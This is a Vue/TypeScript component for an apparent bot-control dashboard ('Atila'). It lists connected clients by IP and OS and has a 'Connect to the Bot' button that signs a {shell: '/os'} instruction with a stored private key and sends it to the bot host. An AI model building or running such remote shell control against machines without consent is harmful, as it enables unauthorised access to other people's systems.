<template>
  <v-data-table
    dense
    :headers = 'headers'
    :items = 'clients'
    item-key = 'id'
    :search = 'search'
    color = 'rgba(189, 147, 249, 1)'
    flat
    show-select
    v-model = 'selected'
    @input = 'interactionDialogUpdateClients'
    :single-select = 'true'
  >
    <template
      v-slot:top
    >
      <v-text-field
        outlined
        dense
        v-model = 'search'
        label = 'Search'
        color = 'rgba(189, 147, 249, 1)'
        class = '
          pt-4
          ml-4
          mr-4
        '
      ></v-text-field>

      <v-text-field
        @change = 'sabeBotHost'
        outlined
        dense
        v-model = 'botHost'
        label = 'Connect Directly To A Bot'
        color = 'rgba(189, 147, 249, 1)'
        class = '
          ml-4
          mr-4
        '
      ></v-text-field>

      <v-btn
        x-small
        outlined
        tile
        color = 'rgba(189, 147, 249, 1)'
        width = '100%'
        class = '
          pl-4
        '
        @click = 'connectWithBot'
      >
        Connect to the Bot
      </v-btn>

      <v-btn
        x-small
        outlined
        tile
        color = 'rgba(189, 147, 249, 1)'
        width = '100%'
        class = '
          pl-4
        '
        @click = 'tableUpdate'
      >
        Refresh Bots
      </v-btn>
    </template>

    <!--  -->

    <template
      v-slot:footer
    >
    </template>
  </v-data-table>
</template>

<script lang = 'ts'>
import Vue from 'vue'

import InteractionDialog from '@/components/dashboard/interaction-dialog.vue'

import EventBus from '@/src/EventBus'
import * as Service from '@/src/services'

import { mapGetters, mapActions } from 'vuex'

export default Vue.extend({
  components: {
    InteractionDialog,
  },

  data: () => ({
    search: '',
    selected: [],
    clients: [] as any[],
    dialog: false,
    headers: [
      { text: 'IP', value: 'ip' },
      { text: 'OS', value: 'system.name' },
    ],
    intervalIsActive: false,
    botHost: '',
  }),

  computed: {
    ...mapGetters([
      'getAtilaHost',
      'getAtilaToken',
      'getBotHost',
      'getPrivateKey',
    ])
  },

  methods: {
    ...mapActions([
      'setBotHost',
    ]),

    async connectWithBot () {
      const message = await Service.Crypto.sign(this.getPrivateKey, { shell: '/os' })

      const reply = await new Service.Atila(
        this.$axios,
        this.getBotHost ? this.getBotHost : this.getAtilaHost,
        '<nil>'
      ).publishMessage('<nil>', 'instruction', message)
      if (!reply) {
        alert('Unable to connect')
      }

      console.log(reply)
    },

    sabeBotHost () {
      this.setBotHost(this.botHost)
    },

    interactionDialogUpdateClients () {
      EventBus.$emit('interactionDialogUpdateClients', this.selected)
      if (this.selected.length)
        EventBus.$emit('interactionDialogUpdateSelectedClient', this.selected[0].id)
    },

    async tableUpdate () {
      const clients = await new Service.Atila(this.$axios, this.getAtilaHost, this.getAtilaToken).getClients()
      if (clients)
        this.clients = clients
    },
  },

  mounted () {
    this.tableUpdate()

    this.botHost = this.getBotHost
    
    EventBus.$on('clientsTableUpdate', async () => await this.tableUpdate())
  },
})
</script>

<style lang = 'css' scoped>
</style>
